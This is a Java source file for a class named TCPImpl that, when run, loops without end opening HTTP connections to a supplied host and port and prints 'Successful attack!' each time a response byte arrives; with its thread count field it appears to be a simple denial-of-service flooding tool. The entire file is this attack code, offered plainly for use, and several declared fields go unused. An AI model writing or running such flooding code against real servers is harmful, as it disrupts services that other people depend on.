import java.io.*;
import java.net.*;

public class TCPImpl implements Runnable  {

    private BufferedWriter writer;
    private OutputStreamWriter outputStreamWriter;
    private String hostname;
    private String msg;
    private int port;
    private int threads;
    private Thread t;
    private URL url;
    private URLConnection conn;
    private BufferedInputStream bufferedInputStream;


    public TCPImpl(String hostname, int port, int threads){
        this.hostname = hostname;
        this.port = port;
        this.threads = threads;
    }


    @Override
    public void run() {
        while(true){
            try {
                url = new URL("http://" + getHostname() + ":" + getPort() + "/");
                conn = url.openConnection();
                System.out.println("Connection success!");
                bufferedInputStream = new BufferedInputStream(conn.getInputStream());
                byte[] bytes = new byte[1024];
                int len = -1;
                StringBuffer sb = new StringBuffer();

                if(bufferedInputStream != null){
                    if((len = bufferedInputStream.read()) != -1){
                        System.out.println("Successful attack!");
                        bufferedInputStream.close();
                    }
                }
            } catch (MalformedURLException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    public String getHostname() {
        return hostname;
    }

    public int getPort() {
        return port;
    }

    public int getThreads() {
        return threads;
    }

    @Override
    public String toString() {
        return "TCPImpl{" +
                "msg='" + msg + '\'' +
                ", port=" + port +
                ", threads=" + threads +
                ", url=" + url +
                '}';
    }
}
